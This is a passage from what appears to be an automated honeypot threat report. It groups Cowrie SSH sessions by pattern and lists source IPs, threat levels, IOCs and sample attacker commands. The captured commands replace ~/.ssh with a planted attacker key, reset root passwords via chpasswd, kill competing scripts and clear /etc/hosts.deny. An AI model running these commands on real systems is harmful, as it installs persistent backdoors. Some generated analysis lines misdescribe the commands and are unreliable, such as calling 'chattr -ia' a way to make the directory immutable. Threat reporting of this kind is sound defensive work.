- SSH key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`  
- Root password: `root:L7DLrckXGKoW`

**Threat Level:** **High** – attacker achieved root access and installed a persistent SSH backdoor, enabling future exploitation.

**Brief Summary:** The attacker injected a malicious SSH key and reset the root password to establish a permanent remote access point on the target system.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:L7DLrckXGKoW"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: d3db3770f03b...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 103.91.246.101

#### Analysis

**Attack Type:**  
Backdoor installation / botnet recruitment  

**Objective:**  
Gain remote SSH access to the host and gather system details for potential botnet integration.  

**Techniques Used:**  
- Manipulation of `.ssh` directory (removing, recreating, disabling attributes).  
- Injection of a malicious public key into `authorized_keys`.  
- System reconnaissance commands (`cpuinfo`, `free`, `uname`, `top`, etc.) to collect hardware and OS information.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **103.91.246.101**  
- Public SSH key string inserted into `.ssh/authorized_keys`  
- File path modifications: `/home/.ssh` (creation, deletion, attribute changes)  

**Threat Level:** Medium – the attacker successfully installed a backdoor and performed reconnaissance, but no payload download or further exploitation was observed.  

**Brief Summary:**  
The attacker injected a malicious SSH key into the host’s `.ssh/authorized_keys` directory and executed system‑info commands to gather hardware details, likely preparing for remote access or botnet participation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "red\nUgEaAu4Xaa0Z\nUgEaAu4Xaa0Z"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "red\nUgEaAu4Xaa0Z\nUgEaAu4Xaa0Z\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: d1bc56042e5b...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 187.174.238.116

#### Analysis

**Attack Type:** Backdoor installation / credential compromise  
**Objective:** Gain privileged (root) access by injecting an SSH key and resetting the root password.  
**Techniques:**  
- `chattr -ia`/`lockr -ia` to make `.ssh` immutable, then overwrite it with a new SSH key (`authorized_keys`).  
- `echo … | chpasswd | bash` to set root password and launch a shell.  
- Removal of temporary scripts (`rm /tmp/...`) and killing processes (`pkill -9`).  
- Adding an entry to `/etc/hosts.deny`.  
- System‑info gathering (CPU, memory, disk

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:EHruperMS2an"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 4bee8322467c...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 103.143.238.207

#### Analysis

**Attack Type:**  
Backdoor installation + reconnaissance (SSH key injection with system information gathering)

**Objective:**  
Gain remote access via SSH and collect detailed system data (CPU, memory, disk usage) for potential exploitation or botnet recruitment.

**Techniques & Tools Used:**
- `chattr -ia` / `lockr -ia` to make `.ssh` immutable
- Removal and recreation of `.ssh`, insertion of a malicious public key into `authorized_keys`
- System info commands (`cat /proc/cpuinfo`, `uname`, `lscpu`, `df`, `top`, `w`, `crontab -l`) to gather hardware, memory, disk, process, and user data

**Indicators of Compromise (IOCs):**
- Attacker IP: **103.143.238.207**  
- SSH public key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`  
- File: `.ssh/authorized_keys`

**Threat Level:** Medium (moderate sophistication, potential for remote exploitation)

**Brief Summary:**  
The attacker injected a malicious SSH key into the honeypot’s `authorized_keys`, made the directory immutable to hide changes, and performed extensive system reconnaissance to gather hardware and process information, likely preparing for remote exploitation or botnet recruitment.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "red\nTETGJGQYTqab\nTETGJGQYTqab"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "red\nTETGJGQYTqab\nTETGJGQYTqab\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 708736db9f33...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 103.149.27.208

#### Analysis

**1. Attack Type:**  
Backdoor installation (SSH key injection) combined with reconnaissance.

**2. Objective:**  
Gain remote SSH access and gather detailed system information to facilitate further exploitation or persistence.

**3. Techniques & Tools Used:**
- **SSH Key Injection:** `rm -rf .ssh; mkdir .ssh; echo "ssh-rsa … mdrfckr" > .ssh/authorized_keys` – adds a malicious key.
- **Permission Manipulation:** `chmod -R go= ~/.ssh` to restrict group write access.
- **Password Modification Attempts:** `passwd` commands with repeated password inputs.
- **System Reconnaissance:** `cat /proc/cpuinfo`, `free -m`, `uname`, `lscpu`, `top`, `crontab -l`, `w`, `df -h`, etc. to collect CPU, memory, architecture, running processes, cron jobs, logged users.

**4. Indicators of Compromise (IOCs):**
- **IP:** 103.149.27.208
- **SSH

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "123\nMdHpIIYM5IVC\nMdHpIIYM5IVC"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "123\nMdHpIIYM5IVC\nMdHpIIYM5IVC\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 7a000d4b430c...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 45.78.222.174

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection  
**Objective:** Gain persistent SSH access to the honeypot host.  
**Techniques:**  
- Manipulation of `.ssh` directory (`rm -rf`, `mkdir`, `chattr`, `lockr`)  
- Injection of a public‑key into `authorized_keys` with `echo`.  
- Attempted password change via `passwd`.  
- System reconnaissance (CPU, memory, OS, filesystem info).  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **45.78.222.174** (Singapore)  
- SSH public key string:  
  ```
  ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr
  ```

**Threat Level:** Medium – the attacker successfully installed a backdoor but did not deploy additional malicious payloads.  
**Brief Summary:** The attacker injected an SSH key into the honeypot’s `.ssh` directory, attempted to set a new password, and gathered system information, aiming to establish persistent remote access.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "1qaz@WSX\nHdfxgQUczYpW\nHdfxgQUczYpW"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "1qaz@WSX\nHdfxgQUczYpW\nHdfxgQUczYpW\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+9 more)
```

---

### Pattern: cb7ff8beff29...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 20.12.41.6

#### Analysis

**Attack Type:** Backdoor installation / botnet recruitment  
**Objective:** Gain persistent remote access via SSH by installing a malicious key and resetting the root password.  

**Techniques Used:**  
- `chattr`/`lockr` to hide `.ssh` directory.  
- Creation of `/~/.ssh/authorized_keys` with a hard‑coded RSA key.  
- `chmod -R go= ~/.ssh` to restrict permissions.  
- `echo "root:s7xOa3p7Tuqg"|chpasswd|bash` to change the root password.  
- Killing processes (`pkill -9`) and clearing `/tmp/secure.sh`, `/tmp/auth.sh`.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **20.12.41.6**  
- Malicious SSH key string (RSA public key).  
- Files modified: `~/.ssh/authorized_keys`, `/etc/hosts.deny`  
- Commands executed: `chattr -ia .ssh`, `lockr -ia .ssh`, `chmod -R go= ~/.ssh`.  

**Threat Level:** **High** – root access and SSH key injection allow full control of the host.  

**Brief Summary:** The attacker injected a malicious SSH key into the honeypot’s `.ssh` directory, reset the root password, and hid the configuration to establish a persistent backdoor for remote exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:s7xOa3p7Tuqg"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 5665c1e9cf57...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 202.70.78.237

#### Analysis

**Attack Type:** Backdoor installation / credential compromise  
**Objective:** Gain SSH access with a new key and set the root password for full system control.  

**Techniques Used:**  
- Creation of `.ssh` directory and injection of an RSA public key into `authorized_keys`.  
- Changing the root password via `chpasswd`.  
- Killing suspicious processes (`secure.sh`, `auth.sh`, `sleep`).  
- System reconnaissance (CPU, memory, disk usage).  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **202.70.78.237**  
- File path: `.ssh/authorized_keys` with the injected key string.  
- Root password change command (`echo "root:Jj2ANmH9iycG"|chpasswd`).  

**Threat Level:** High – attacker has achieved privileged access and could execute arbitrary commands on the system.  

**Brief Summary:** The session shows an attacker installing a new SSH key and setting the root password, effectively creating a backdoor for full control of the honeypot.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:Jj2ANmH9iycG"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 1b5ab9b5fee4...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 152.42.165.179

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection  
**Objective:** Gain persistent remote access to the honeypot by adding a valid SSH public key, while collecting basic system information for reconnaissance.  

**Techniques Used:**
- Creation of `.ssh` directory and modification of permissions (`chmod -R go= ~/.ssh`).  
- Injection of an SSH public key into `authorized_keys`.  
- System‑information gathering commands (e.g., `/proc/cpuinfo`, `free`, `uname`, `crontab`, `w`).  

**Indicators of Compromise (IOCs):**
- Attacker IP: **152.42.165.179**  
- SSH public key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"`  
- File created: `~/.ssh/authorized_keys`  

**Threat Level:** **High** – the attacker successfully installed a backdoor and attempted to modify system credentials, indicating potential for persistent compromise.  

**Brief Summary:** The attacker injected an SSH key into the honeypot’s authorized keys, enabling remote access, while gathering basic system information for reconnaissance.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "123\nRw6Dca30aTnr\nRw6Dca30aTnr"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "123\nRw6Dca30aTnr\nRw6Dca30aTnr\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 39d67d5f6cdb...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 103.149.27.208

#### Analysis

**Attack Type:** Backdoor installation (SSH key injection) with reconnaissance  
**Objective:** Gain remote access via SSH and gather system information for further exploitation.  
**Techniques:**  
- Creation/overwrite of `~/.ssh` directory and injection of a public RSA key (`authorized_keys`).  
- Permission manipulation (`chmod -R go= ~/.ssh`) to restrict access.  
- Use of `lockr -ia .ssh` (likely to hide the SSH folder).  
- Attempted password change via `passwd` with scripted input.  
- System‑info gathering: CPU, memory, filesystem, crontab, uptime, uname, top, whoami, lscpu, df.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **103.149.27.208** (Hong Kong).  
- RSA public key string in `authorized_keys` (hashable for detection).  
- File path `/home/.ssh/authorized_keys`.  

**Threat Level:** Medium – the attacker successfully installed a backdoor and performed reconnaissance, but no evidence of malicious payload execution or data exfiltration.  

**Brief Summary:** The session shows an attacker injecting an SSH key to establish remote access while collecting system details for potential further exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "red\n1MhOYrxJYUp4\n1MhOYrxJYUp4"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "red\n1MhOYrxJYUp4\n1MhOYrxJYUp4\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 49bda6cb210e...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 103.149.27.208

#### Analysis

**Attack Type:** Backdoor installation / credential theft  
**Objective:** Gain unrestricted SSH access to the system and establish a persistent foothold.  

**Techniques & Tools Used:**
- **SSH key injection** – creation of a new RSA public key in `~/.ssh/authorized_keys`.  
- **Root password reset** – `echo "root:zn7t86eND2F2"|chpasswd|bash` to set the root account.  
- **Process suppression** – killing various background processes (`pkill -9 secure.sh`, etc.) and blocking host access (`echo > /etc/hosts.deny`).  

**Indicators of Compromise (IOCs):**
- Attacker IP: `103.149.27.208` (Hong Kong).  
- RSA public key string in the authorized_keys file:  
  ```
  ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr
  ```
- File paths: `~/.ssh/authorized_keys`, `/etc/hosts.deny`.  

**Threat Level:** **High** – the attacker has established a persistent SSH backdoor and altered root credentials, enabling full system control.  

**Brief Summary:** The attacker injected an RSA key into the SSH authorized keys file, reset the root password, and suppressed background processes to create a permanent backdoor on the honeypot.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:zn7t86eND2F2"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: fad7e08441e5...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 85.185.120.213

#### Analysis

**Attack Type:** Backdoor installation / Remote Access  
**Objective:** Create an SSH key in the victim’s `~/.ssh/authorized_keys` file so that the attacker can log in later, while gathering basic system information.  

**Techniques Used:**
- File manipulation (`chattr`, `lockr`, `rm -rf`, `mkdir`) to secure and overwrite the `.ssh` directory.
- Injection of a custom RSA public key into `authorized_keys`.
- System reconnaissance commands (CPU info, memory usage, file listings, cron jobs, user identity).

**Indicators of Compromise (IOCs):**
- Attacker IP: **85.185.120.213**  
- SSH public key string (the long RSA key in the echo command).  
- File path: `~/.ssh/authorized_keys`  

**Threat Level:** Medium – moderate sophistication with a clear goal to establish persistent remote access.

**Brief Summary:** The attacker overwrote the victim’s SSH directory, injected a custom RSA key for future login, and performed basic system reconnaissance.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "user8\nFZJzwet81yHl\nFZJzwet81yHl"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "user8\nFZJzwet81yHl\nFZJzwet81yHl\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 324574a5405f...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 102.220.23.226

#### Analysis

**1. Attack Type:**  
Backdoor installation via SSH key injection combined with reconnaissance.

**2. Objective:**  
The attacker wants to gain persistent remote access (via the injected SSH key) and gather system information for future exploitation or monitoring.

**3. Techniques & Tools Used:**
- `chattr`, `lockr` – used to set immutable attributes on `.ssh` directory.
- Creation of `.ssh/authorized_keys` with a public RSA key.
- Password manipulation via `passwd` (attempted to change the local user password).
- System‑info gathering commands (`cat /proc/cpuinfo`, `free -m`, `ls`, `uname`, `top`, `whoami`, `lscpu`, `df`).

**4. Indicators of Compromise (IOCs):**
- Attacker IP: **102.220.23.226** (Kenya)
- Public SSH key string in `.ssh/authorized_keys`:  
  `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`
- Password attempts: `steampass` and `boHxTSLqwbCS`.

**5. Threat Level:**  
High – the attacker successfully installed a backdoor, potentially enabling remote exploitation.

**6. Brief Summary:**  
The attacker injected an SSH key into the honeypot’s `.ssh/authorized_keys

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "steampass\nboHxTSLqwbCS\nboHxTSLqwbCS"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "steampass\nboHxTSLqwbCS\nboHxTSLqwbCS\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 3f6a7cef41c4...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 101.36.107.103

#### Analysis

**Attack Type:** Backdoor installation / botnet recruitment  
**Objective:** Install an SSH key to gain remote access and set a user‑password; gather host information for potential use in a botnet.  

**Techniques & Tools:**
- `lockr -ia .ssh` – likely used to hide or lock the `.ssh` directory.
- Creation of `/home/.ssh/authorized_keys` with a hard‑coded RSA key.
- `passwd` commands to set a new UNIX password (multiple attempts).
- System reconnaissance: CPU info, memory usage, file listings, crontab, uptime (`w`), architecture (`uname -m`, `uname -a`), user identity (`whoami`), and disk space (`df`).  

**Indicators of Compromise (IOCs):**
- Attacker IP: **101.36.107.103**  
- SSH key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"`  
- File path: `/home/.ssh/authorized_keys`  

**Threat Level:** **High** – the attacker is installing a persistent backdoor and collecting system data for botnet use.  

**Brief Summary:** The attacker injected an SSH key into the honeypot, set a password, and performed extensive system reconnaissance to facilitate future remote exploitation or botnet recruitment.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "1qazXSW@\nDb6nSpPkCjv5\nDb6nSpPkCjv5"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "1qazXSW@\nDb6nSpPkCjv5\nDb6nSpPkCjv5\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 06cf58c54bcd...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 201.76.120.30

#### Analysis

**Attack Type:** Backdoor installation with SSH key injection + system reconnaissance  
**Objective:** Gain persistent remote access (root) and gather system details to facilitate future exploitation.  

**Techniques & Tools:**
- `chattr -ia` / `lockr -ia`: set immutable attributes on `.ssh` directory to prevent tampering.
- `chmod -R go= ~/.ssh`: restrict permissions on SSH files.
- `echo … > .ssh/authorized_keys`: inject a malicious public key.
- `chpasswd | bash`: change root password to “EnY5Fre8LORx”.
- `pkill -9` and `rm -rf`: kill/remove suspicious scripts (`secure.sh`, `auth.sh`, `sleep`) and clear `/etc/hosts.deny`.
- System info commands (cpuinfo, free, ls, crontab, w, uname, lscpu, df) for reconnaissance.

**Indicators of Compromise (IOCs):**
- Attacker IP: **201.76.120.30**  
- Public SSH key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQ...`  
- Modified files: `.ssh/authorized_keys`, `/etc/hosts.deny`.  
- Root password set to “EnY5Fre8LORx”.

**Threat Level:** **High** – attacker achieved root access and installed a persistent backdoor.

**Brief Summary:** The session shows an attacker injecting a malicious SSH key, changing the root password, and gathering system information, effectively establishing a high‑impact backdoor on the target.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:EnY5Fre8LORx"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
